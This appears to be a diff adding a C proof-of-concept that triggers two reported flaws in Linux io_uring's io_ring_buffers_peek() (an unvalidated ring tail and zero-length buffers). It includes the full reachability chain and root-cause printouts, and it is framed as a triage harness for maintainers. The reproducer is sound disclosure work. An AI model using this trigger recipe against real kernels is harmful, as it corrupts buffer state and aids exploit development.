@@ -1,0 +1,322 @@
+// SPDX-License-Identifier: GPL-2.0
+/*
+ * poc_kbuf_triage.c — triage reproducer for io_uring/kbuf.c findings.
+ *
+ * Target file : io_uring/kbuf.c -> io_ring_buffers_peek()
+ * Findings    : [2] UNVALIDATED_TAIL_DELTA   (mode: tail-delta, default)
+ *               [8] ZERO_LEN_BUFFER_IN_LOOP  (mode: zero-len)
+ *
+ * Requires    : Linux >= 6.10 (IORING_RECVSEND_BUNDLE), liburing >= 2.7
+ * Build       : gcc -O2 -Wall -o poc_kbuf_triage poc_kbuf_triage.c -luring
+ * Run         : ./poc_kbuf_triage [tail-delta|zero-len] [sqe_len_override]
+ *
+ * ---------------------------------------------------------------------------
+ * WHAT THIS IS AND WHAT IT IS NOT
+ * ---------------------------------------------------------------------------
+ * This is a VALIDATION HARNESS, not a weaponised exploit. It demonstrates a
+ * kernel-side input-validation defect and prints the violated invariant so a
+ * maintainer can reproduce it from a bug report.
+ *
+ * Blast radius is the calling process only:
+ *   - every address read from the ring passes access_ok() before use, so no
+ *     kernel address can ever become an I/O target;
+ *   - every slot index is computed as (head & bl->mask), so no access can
+ *     leave the mapped ring region.
+ * The consequence is buffer-accounting corruption and silent overwrite of the
+ * caller's OWN buffers. No kernel memory is corrupted, no privilege boundary
+ * is crossed. See TRIAGE.md for why that classification matters for routing
+ * the report.
+ *
+ * ---------------------------------------------------------------------------
+ * THE REACHABILITY CHAIN (read this before "fixing" the parameters)
+ * ---------------------------------------------------------------------------
+ * The vulnerable function io_ring_buffers_peek() is reached only via
+ * io_buffers_peek(), and only if every link below holds:
+ *
+ *   1. io_recv():            io_do_buffer_select(req)          -> IOSQE_BUFFER_SELECT
+ *   2. io_recv():            sel.val = sr->len                 -> sqe->len MUST be != 0
+ *   3. io_recv_buf_select(): !(issue_flags & IO_URING_F_UNLOCKED)
+ *                            -> data must already be queued so the request is
+ *                               issued inline and never punted to io-wq
+ *   4. io_recv_buf_select(): sr->flags & IORING_RECVSEND_BUNDLE
+ *                            -> sqe->ioprio = IORING_RECVSEND_BUNDLE
+ *   5. io_recv_buf_select(): arg.max_len = sel->val != 0
+ *   6. io_ring_buffers_peek(): KBUF_MODE_EXPAND && nr_avail > nr_iovs
+ *                            && arg->max_len
+ *                            -> EXPANSION must fire, otherwise nr_iovs stays 1
+ *                               and the do/while runs a single iteration
+ *   7. io_ring_buffers_peek(): needed = (max_len + bufs[head].len - 1)
+ *                                       / bufs[head].len
+ *                            -> nr_avail is clamped to `needed`, so max_len
+ *                               must be large relative to buf_len
+ *
+ * Link 2 is the one that silently kills naive reproducers: with sqe->len == 0
+ * the kernel takes arg.max_len == 0, skips the EXPAND branch, builds exactly
+ * one iovec and the bug is never exercised. That is why this harness passes
+ * sqe->len explicitly.
+ */
+#define _GNU_SOURCE
+#include <errno.h>
+#include <inttypes.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/mman.h>
+#include <sys/socket.h>
+#include <linux/io_uring.h>
+#include <liburing.h>
+
+#ifndef IORING_RECVSEND_BUNDLE
+#define IORING_RECVSEND_BUNDLE		(1U << 4)
+#endif
+
+/*
+ * IORING_REGISTER_PBUF_STATUS — the numeric value differs between uapi
+ * revisions. It is used only for a secondary observation, so a mismatch is
+ * non-fatal: the primary verdict does not depend on it.
+ * Verify with:  grep -n PBUF_STATUS /usr/include/linux/io_uring.h
+ */
+#ifndef IORING_REGISTER_PBUF_STATUS
+#define IORING_REGISTER_PBUF_STATUS	34
+/*
+ * Both the opcode and its argument struct arrived together (v6.7), so if the
+ * opcode is missing the struct is missing too. Older uapi headers
+ * (e.g. linux-libc-dev 6.1) lack it; without this fallback the harness does
+ * not build at all. Verified: gcc 12.2 + liburing-dev 2.3 on Debian 12.
+ */
+struct io_uring_buf_status {
+	__u32	buf_group;	/* in: buffer group id */
+	__u32	head;		/* out: kernel-side bl->head */
+	__u32	resv[3];
+};
+#endif
+
+#define BGID		1u
+#define RING_ENTRIES	2u	/* power of two; real capacity = 2 slots */
+#define BUF_LEN		64u	/* bytes per legitimately published buffer */
+#define TAIL_DELTA	100u	/* bogus tail: 50x the real capacity */
+
+static void die(const char *what)
+{
+	fprintf(stderr, "[-] %s: %s\n", what, strerror(errno));
+	exit(1);
+}
+
+static void *xzalloc(size_t n)
+{
+	void *p = calloc(1, n);
+
+	if (!p)
+		die("calloc");
+	return p;
+}
+
+/* Secondary observation: ask the kernel what bl->head became. */
+static int query_head(int ring_fd, unsigned int bgid, unsigned int *head)
+{
+	struct io_uring_buf_status st;
+
+	memset(&st, 0, sizeof(st));
+	st.buf_group = bgid;
+
+	if (io_uring_register(ring_fd, IORING_REGISTER_PBUF_STATUS, &st, 1))
+		return -1;
+
+	*head = st.head;
+	return 0;
+}
+
+int main(int argc, char *argv[])
+{
+	const char *mode = (argc > 1) ? argv[1] : "tail-delta";
+	struct io_uring ring;
+	struct io_uring_buf_reg reg;
+	struct io_uring_buf_ring *br;
+	struct io_uring_sqe *sqe;
+	struct io_uring_cqe *cqe;
+	char *real_buf[RING_ENTRIES];
+	char *payload;
+	size_t payload_len, capacity, sqe_len;
+	unsigned int tail_to_publish, i, head;
+	long page = sysconf(_SC_PAGESIZE);
+	int zero_len_mode, head_ok, sp[2], ret;
+
+	if (strcmp(mode, "tail-delta") && strcmp(mode, "zero-len")) {
+		fprintf(stderr, "usage: %s [tail-delta|zero-len] [sqe_len]\n",
+			argv[0]);
+		return 2;
+	}
+	zero_len_mode = !strcmp(mode, "zero-len");
+	head = 0;
+
+	capacity = (size_t)RING_ENTRIES * BUF_LEN;
+
+	payload_len = zero_len_mode ? (size_t)2 * BUF_LEN
+				    : (size_t)TAIL_DELTA * BUF_LEN;
+	sqe_len = (argc > 2) ? (size_t)strtoul(argv[2], NULL, 0) : payload_len;
+
+	printf("=== io_uring/kbuf.c triage reproducer ===\n");
+	printf("[*] mode          : %s\n", mode);
+	printf("[*] ring_entries  : %u (real capacity = %zu bytes)\n",
+	       RING_ENTRIES, capacity);
+	printf("[*] buf_len       : %u bytes\n", BUF_LEN);
+	printf("[*] sqe->len      : %zu  (drives sel.val -> arg.max_len)\n",
+	       sqe_len);
+
+	if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp))
+		die("socketpair");
+
+	payload = xzalloc(payload_len);
+	memset(payload, 0x55, payload_len);
+
+	if (write(sp[0], payload, payload_len) != (ssize_t)payload_len)
+		die("write(payload)");
+	printf("[*] queued        : %zu bytes on the socket\n", payload_len);
+
+	ret = io_uring_queue_init(8, &ring, 0);
+	if (ret) {
+		errno = -ret;
+		die("io_uring_queue_init");
+	}
+
+	br = mmap(NULL, page, PROT_READ | PROT_WRITE,
+		  MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	if (br == MAP_FAILED)
+		die("mmap(ring)");
+
+	memset(&reg, 0, sizeof(reg));
+	reg.ring_addr = (unsigned long)br;
+	reg.ring_entries = RING_ENTRIES;
+	reg.bgid = BGID;
+
+	ret = io_uring_register_buf_ring(&ring, &reg, 0);
+	if (ret) {
+		fprintf(stderr,
+			"[-] io_uring_register_buf_ring failed (%d): kernel too "
+			"old, or CONFIG_IO_URING disabled, or io_uring "
+			"restricted (check sysctl kernel.io_uring_disabled).\n",
+			ret);
+		return 1;
+	}
+	io_uring_buf_ring_init(br);
+	printf("[*] pbuf ring     : registered, bgid=%u, br=%p\n", BGID,
+	       (void *)br);
+
+	for (i = 0; i < RING_ENTRIES; i++) {
+		real_buf[i] = xzalloc(BUF_LEN);
+		memset(real_buf[i], 0xAA, BUF_LEN);
+
+		br->bufs[i].addr = (unsigned long)real_buf[i];
+		br->bufs[i].bid = i;
+		br->bufs[i].len = (zero_len_mode && i > 0) ? 0 : BUF_LEN;
+	}
+
+	tail_to_publish = zero_len_mode ? RING_ENTRIES : TAIL_DELTA;
+	__atomic_store_n(&br->tail, (__u16)tail_to_publish, __ATOMIC_RELEASE);
+	printf("[*] published     : tail=%u, head=0 -> kernel believes %u "
+	       "buffers are available\n", tail_to_publish, tail_to_publish);
+	printf("[*] legitimate    : %u buffers, %zu bytes of distinct "
+	       "capacity\n", RING_ENTRIES, capacity);
+
+	sqe = io_uring_get_sqe(&ring);
+	if (!sqe)
+		die("io_uring_get_sqe");
+
+	io_uring_prep_recv(sqe, sp[1], NULL, sqe_len, 0);
+	sqe->flags |= IOSQE_BUFFER_SELECT;
+	sqe->buf_group = BGID;
+	sqe->ioprio = IORING_RECVSEND_BUNDLE;
+
+	ret = io_uring_submit(&ring);
+	if (ret < 0) {
+		errno = -ret;
+		die("io_uring_submit");
+	}
+
+	ret = io_uring_wait_cqe(&ring, &cqe);
+	if (ret) {
+		errno = -ret;
+		die("io_uring_wait_cqe");
+	}
+
+	printf("[*] CQE           : res=%d flags=0x%x buf_id=%u\n",
+	       cqe->res, cqe->flags, cqe->flags >> IORING_CQE_BUFFER_SHIFT);
+	io_uring_cqe_seen(&ring, cqe);
+
+	printf("\n--- verdict ---\n");
+
+	if (cqe->res < 0) {
+		printf("[?] request failed: %d (%s)\n", cqe->res,
+		       strerror(-cqe->res));
+		printf("    Either fixed on this kernel, or the peek path was "
+		       "not taken.\n    Walk the 7-link chain in the header "
+		       "comment; the usual culprits are\n    sqe->len == 0 "
+		       "(link 2) and the request being punted to io-wq "
+		       "(link 3).\n");
+		return 3;
+	}
+
+	head_ok = !query_head(ring.ring_fd, BGID, &head);
+	if (head_ok)
+		printf("[*] kernel bl->head after completion: %u\n", head);
+	else
+		printf("[*] bl->head unavailable "
+		       "(IORING_REGISTER_PBUF_STATUS opcode mismatch)\n");
+
+	if (zero_len_mode) {
+		if (head_ok && head > 1) {
+			printf("[!] VULNERABLE: %u ring slots consumed while "
+			       "only bufs[0] carried data.\n", head);
+			printf("    %u published buffer(s) were discarded with "
+			       "zero bytes transferred.\n", head - 1);
+			printf("    Root cause: io_ring_buffers_peek() checks "
+			       "!len only for the FIRST\n    buffer (before the "
+			       "loop); zero-length buffers deeper in the ring "
+			       "are\n    appended as iov_len == 0 and still "
+			       "count toward bl->head += nr.\n");
+			return 0;
+		}
+		printf("[+] NOT reproduced (head=%u, head_ok=%d).\n", head,
+		       head_ok);
+		return head_ok ? 3 : 4;
+	}
+
+	printf("[*] bytes transferred       : %d\n", cqe->res);
+	printf("[*] distinct buffer capacity  : %zu\n", capacity);
+
+	if ((size_t)cqe->res > capacity) {
+		printf("\n[!] VULNERABLE - invariant violated.\n");
+		printf("    The kernel moved %d bytes through a ring that only "
+		       "ever offered %zu bytes of\n    distinct buffer space: "
+		       "%zu bytes were written into slots that had already "
+		       "been\n    filled. The same %u physical buffers were "
+		       "mapped repeatedly and silently\n    overwritten.\n",
+		       cqe->res, capacity, (size_t)cqe->res - capacity,
+		       RING_ENTRIES);
+		if (head_ok && head > RING_ENTRIES)
+			printf("    bl->head advanced to %u in a %u-slot ring "
+			       "-> permanent head/tail desync;\n    the buffer "
+			       "group is now unusable.\n", head, RING_ENTRIES);
+		printf("\n    Root cause, io_ring_buffers_peek():\n");
+		printf("        tail = smp_load_acquire(&br->tail);   /* "
+		       "user-writable */\n");
+		printf("        nr_avail = min_t(__u16, tail - head, "
+		       "UIO_MAXIOV);\n");
+		printf("    with no check that (__u16)(tail - head) <= "
+		       "bl->mask + 1.\n");
+		printf("    min_t(__u16, ...) also turns a negative "
+		       "(tail - head) into a large\n"
+		       "    positive count, so head > tail reads as "
+		       "\"almost full\".\n");
+		return 0;
+	}
+
+	printf("\n[+] NOT reproduced: res=%d <= capacity=%zu.\n", cqe->res,
+	       capacity);
+	printf("    Either the kernel validates tail against ring capacity "
+	       "(fixed), or\n    the multi-buffer peek path was not taken - "
+	       "re-check link 2 (sqe->len)\n    and link 7 (max_len vs "
+	       "buf_len ratio).\n");
+	return 3;
+}
